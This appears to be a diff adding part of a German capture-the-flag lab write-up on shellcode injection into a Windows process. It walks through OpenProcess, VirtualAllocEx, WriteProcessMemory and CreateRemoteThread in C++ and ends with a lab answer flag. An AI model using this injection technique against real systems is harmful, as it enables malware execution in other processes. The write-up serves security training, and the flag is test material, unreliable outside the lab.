@@ -75,3 +75,68 @@ Diese Grafik zeigt die Schritte der Shellcode-Injektion in einem Zielprozess dur
 - Die "Malicious Memory Region" (bösartige Speicherregion) ist der Bereich, in dem der Shellcode eingefügt und ausgeführt wird.
 
 Durch diese Schritte wird der Shellcode in den Speicher des Zielprozesses injiziert und ausgeführt, was dem Angreifer die Möglichkeit gibt, Kontrolle über den Zielprozess zu erlangen und bösartige Aktivitäten durchzuführen.
+
+Im ersten Schritt der Shellcode-Injektion müssen wir einen Zielprozess mit speziellen Parametern öffnen. `OpenProcess` wird verwendet, um den Zielprozess zu öffnen, der über die Befehlszeile angegeben wird.
+```C++
+processHandle = OpenProcess(
+	PROCESS_ALL_ACCESS, // Defines access rights
+	FALSE, // Target handle will not be inhereted
+	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments 
+);
+```
+
+
+Im zweiten Schritt müssen wir Speicher in der Größe des Shellcodes allozieren. Die Speicherallokation wird mit `VirtualAllocEx` durchgeführt. Innerhalb des Aufrufs wird der Parameter `dwSize` mit der Funktion sizeof definiert, um die Anzahl der Bytes des Shellcodes zu erhalten, die allokiert werden sollen.
+```C++
+remoteBuffer = VirtualAllocEx(
+	processHandle, // Opened target process
+	NULL, 
+	sizeof shellcode, // Region size of memory allocation
+	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
+	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
+);
+```
+
+
+Im dritten Schritt können wir nun den allokierten Speicherbereich verwenden, um unseren Shellcode zu schreiben. `WriteProcessMemory` wird häufig verwendet, um in Speicherbereiche zu schreiben.
+```C++
+WriteProcessMemory(
+	processHandle, // Opened target process
+	remoteBuffer, // Allocated memory region
+	shellcode, // Data to write
+	sizeof shellcode, // byte size of data
+	NULL
+);
+```
+
+
+Im vierten Schritt haben wir nun die Kontrolle über den Prozess, und unser schädlicher Code ist im Speicher geschrieben. Um den im Speicher befindlichen Shellcode auszuführen, können wir `CreateRemoteThread` verwenden; Threads steuern die Ausführung von Prozessen.
+```C++
+remoteThread = CreateRemoteThread(
+	processHandle, // Opened target process
+	NULL, 
+	0, // Default size of the stack
+	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
+	NULL, 
+	0, // Ran immediately after creation
+	NULL
+);
+```
+
+Wir können diese Schritte zusammenfassen, um einen einfachen Prozessinjektor zu erstellen. Verwenden Sie den bereitgestellten C++ Injektor und experimentieren Sie mit der Prozessinjektion.
+
+Shellcode-Injektion ist die grundlegendste Form der Prozessinjektion; in der nächsten Aufgabe werden wir untersuchen, wie wir diese Schritte für das Process Hollowing modifizieren und anpassen können.
+
+## Fragen:
+
+Identifizieren Sie eine PID eines Prozesses, der als THM-Attacker ausgeführt wird, um diesen zu zielen. Sobald die PID identifiziert ist, geben Sie die PID als Argument an, um shellcode-injector.exe im Verzeichnis Injectors auf dem Desktop auszuführen.
+```
+Gehe auf dem TaskManager und gehe unter Details und suche dort nach einem Prozess, als beispiel nutzte ich den Explorer.exe prozess. syntax shellcode-injector.exe <PID>
+```
+
+Welche Flagge wird nach dem Einspritzen des Shellcodes erhalten?
+```
+THM{1nj3c710n_15_fun!}
+```
+
+# Task 3 -
